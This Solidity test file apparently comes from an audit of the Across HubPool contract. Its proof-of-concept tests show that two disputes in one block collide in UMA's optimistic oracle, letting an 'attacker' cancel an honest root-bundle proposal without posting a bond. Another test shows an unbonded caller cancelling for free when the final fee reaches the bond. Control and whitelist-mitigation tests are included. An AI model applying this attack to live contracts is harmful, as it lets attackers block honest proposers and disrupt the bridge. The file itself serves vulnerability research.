// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { ReplayBase } from "./util/Base.sol";
import { MockStore } from "across-test/utils/HubPoolTestBase.sol";
import { HubPoolInterface } from "across/interfaces/HubPoolInterface.sol";
import { OracleInterfaces } from "across/external/uma/core/contracts/data-verification-mechanism/implementation/Constants.sol";
import { BondToken, ExtendedHubPoolInterface } from "across/hub-pool/BondToken.sol";
import { IERC20 } from "@openzeppelin/contracts-v4/token/ERC20/IERC20.sol";

// UMA Store stub with the REAL ABI (FixedPoint.Unsigned params), unlike the repo's MockStore (uint256 params).
contract UmaStoreStub {
    struct Unsigned {
        uint256 rawValue;
    }
    mapping(address => uint256) public finalFees;

    function setFinalFee(address t, uint256 v) external {
        finalFees[t] = v;
    }

    function computeFinalFee(address t) external view returns (Unsigned memory) {
        return Unsigned(finalFees[t]);
    }

    function payOracleFeesErc20(address erc20, Unsigned memory amount) external {
        IERC20(erc20).transferFrom(msg.sender, address(this), amount.rawValue);
    }
}

contract DvmStub {
    uint256 public requests;

    function requestPrice(bytes32, uint256, bytes memory) external {
        requests++;
    }
}

// INV H5 (dispute soundness): disputeRootBundle either escalates to the DVM with the disputer's bond escrowed, or
// reverts. HubPool.sol:737-771 instead CANCELS (bond refunded to proposer, proposal deleted, no disputer bond) when
// (a) finalFee >= bondAmount or (b) the OO call reverts for ANY reason. One reachable reason in the deployed OO:
// requestId = keccak(requester, identifier, timestamp, ancillaryData) with HubPool passing (identifier, now, "")
// -> two disputes in one block collide ("Request already initialized").
contract T09_DisputeDegeneratesToCancel is ReplayBase {
    address oo; // deployed from the verbatim mainnet source (separate compilation unit, legacy codegen)
    UmaStoreStub umaStore;
    DvmStub dvm;
    address attacker = makeAddr("attacker");
    address honest = makeAddr("honestProposer");

    function setUp() public {
        vm.warp(1_790_000_000);
        createHubPoolFixture();
        umaStore = new UmaStoreStub();
        umaStore.setFinalFee(address(fixture.weth), FINAL_FEE);
        dvm = new DvmStub();
        oo = deployCode("SkinnyOO_mainnet.sol:SkinnyOptimisticOracle", abi.encode(uint256(7200), address(fixture.finder), address(0)));
        fixture.finder.changeImplementationAddress(OracleInterfaces.Store, address(umaStore));
        fixture.finder.changeImplementationAddress(OracleInterfaces.Oracle, address(dvm));
        fixture.finder.changeImplementationAddress(OracleInterfaces.SkinnyOptimisticOracle, oo);
        _fund(attacker);
        _fund(honest);
    }

    function _fund(address who) internal {
        vm.deal(who, 100 ether);
        vm.startPrank(who);
        fixture.weth.deposit{ value: 100 ether }();
        fixture.weth.approve(address(fixture.hubPool), type(uint256).max);
        vm.stopPrank();
    }

    function _proposeAs(address who, bytes32 root) internal {
        uint256[] memory bebn = new uint256[](1);
        vm.prank(who);
        fixture.hubPool.proposeRootBundle(bebn, 1, root, bytes32(0), bytes32(0));
    }

    function _count() internal view returns (uint8 c) {
        (, , , , , c, ) = fixture.hubPool.rootBundleProposal();
    }

    function test_sameBlockCollision_secondDisputeIsFreeCancel_permissionlessProposer() public {
        _proposeAs(attacker, keccak256("junk"));
        vm.prank(attacker);
        fixture.hubPool.disputeRootBundle(); // real dispute; creates OO request (hub, ACROSS-V2, t, "")
        assertEq(dvm.requests(), 1);

        _proposeAs(honest, keccak256("valid bundle")); // same block
        uint256 attackerBefore = fixture.weth.balanceOf(attacker);
        uint256 honestBefore = fixture.weth.balanceOf(honest);
        vm.prank(attacker);
        fixture.hubPool.disputeRootBundle(); // same timestamp -> OO reverts -> caught -> _cancelBundle()

        assertEq(_count(), 0, "honest proposal removed");
        assertEq(dvm.requests(), 1, "no DVM escalation for the second dispute");
        assertEq(fixture.weth.balanceOf(attacker), attackerBefore, "disputer posted no bond");
        assertEq(fixture.weth.balanceOf(honest), honestBefore + fixture.hubPool.bondAmount(), "proposer refunded, unrewarded");
    }

    function test_nextBlock_disputeEscalates_control() public {
        _proposeAs(attacker, keccak256("junk"));
        vm.prank(attacker);
        fixture.hubPool.disputeRootBundle();
        _proposeAs(honest, keccak256("valid bundle"));
        vm.warp(block.timestamp + 1); // different request id
        uint256 attackerBefore = fixture.weth.balanceOf(attacker);
        vm.prank(attacker);
        fixture.hubPool.disputeRootBundle();
        assertEq(dvm.requests(), 2, "escalated");
        assertEq(attackerBefore - fixture.weth.balanceOf(attacker), fixture.hubPool.bondAmount(), "bond escrowed");
    }

    function test_finalFeeAtLeastBond_anyoneCancelsForFree() public {
        _proposeAs(honest, keccak256("valid bundle"));
        umaStore.setFinalFee(address(fixture.weth), fixture.hubPool.bondAmount()); // UMA governance parameter
        address nobody = makeAddr("nobody"); // holds no bond token at all
        vm.prank(nobody);
        fixture.hubPool.disputeRootBundle();
        assertEq(_count(), 0, "proposal cancelled by an unbonded caller");
    }

    function test_abtWhitelist_blocksTheCollisionPrefix() public {
        // Production bond token (ABT): only whitelisted proposers can post a proposal bond (BondToken.sol transferFrom).
        BondToken abt = new BondToken(ExtendedHubPoolInterface(address(fixture.hubPool)));
        fixture.addressWhitelist.addToWhitelist(address(abt));
        fixture.store.setFinalFee(address(abt), MockStore.FinalFee({ rawValue: FINAL_FEE })); // fixture store prices setBond
        umaStore.setFinalFee(address(abt), FINAL_FEE);
        fixture.finder.changeImplementationAddress(OracleInterfaces.Store, address(fixture.store));
        fixture.hubPool.setBond(IERC20(address(abt)), BOND_AMOUNT);
        fixture.finder.changeImplementationAddress(OracleInterfaces.Store, address(umaStore));
        vm.deal(attacker, 10 ether);
        vm.startPrank(attacker);
        abt.deposit{ value: 10 ether }();
        abt.approve(address(fixture.hubPool), type(uint256).max);
        uint256[] memory bebn = new uint256[](1);
        vm.expectRevert(bytes("Transfer not permitted"));
        fixture.hubPool.proposeRootBundle(bebn, 1, keccak256("junk"), bytes32(0), bytes32(0));
        vm.stopPrank();
    }

}
